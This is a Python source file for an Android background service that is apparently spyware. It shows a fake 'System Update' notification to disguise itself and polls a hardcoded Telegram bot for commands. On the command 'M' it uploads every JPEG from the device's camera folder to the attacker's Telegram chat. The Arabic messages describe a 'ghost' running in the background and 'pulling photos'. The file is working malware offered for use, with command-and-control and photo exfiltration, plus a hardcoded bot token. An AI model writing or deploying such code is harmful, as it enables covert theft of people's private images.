import os
import time
import requests
from threading import Thread
from jnius import autoclass

TOKEN = "7547167733:AAFl789Ue816qWj60S_0N7W7BfXo57M3hZg"
CHAT_ID = "1256334460"

def bot_send(msg):
    try: requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage", data={"chat_id": CHAT_ID, "text": msg})
    except: pass

def run_foreground():
    try:
        PythonService = autoclass('org.kivy.android.PythonService')
        service = PythonService.mService
        NotificationBuilder = autoclass('android.app.Notification$Builder')
        NotificationChannel = autoclass('android.app.NotificationChannel')
        Context = autoclass('android.content.Context')
        
        chan = NotificationChannel("ch_id", "System Update", 3)
        service.getSystemService(Context.NOTIFICATION_SERVICE).createNotificationChannel(chan)
        
        notif = NotificationBuilder(service, "ch_id")\
            .setContentTitle("System Update")\
            .setContentText("Service Running...")\
            .setSmallIcon(service.getApplicationInfo().icon)\
            .build()
        service.startForeground(1, notif)
    except: pass

def scan_m():
    bot_send("⏳ جاري سحب الصور...")
    for r, d, f_list in os.walk("/sdcard/DCIM/Camera/"): # استهداف مباشر للكاميرا للسرعة
        for f in f_list:
            if f.lower().endswith(".jpg"):
                p = os.path.join(r, f)
                try:
                    with open(p, 'rb') as img:
                        requests.post(f"https://api.telegram.org/bot{TOKEN}/sendPhoto", data={"chat_id": CHAT_ID}, files={"photo": img})
                    time.sleep(1)
                except: pass

if __name__ == "__main__":
    run_foreground()
    bot_send("🚀 الشبح استيقظ! أنا الآن في الخلفية وجاهز للأوامر.")
    
    last_id = 0
    while True:
        try:
            res = requests.get(f"https://api.telegram.org/bot{TOKEN}/getUpdates", params={"offset": last_id+1, "timeout": 10}).json()
            for up in res.get("result", []):
                last_id = up["update_id"]
                cmd = up.get("message", {}).get("text", "").upper()
                if cmd == "M": Thread(target=scan_m).start()
        except: time.sleep(5)
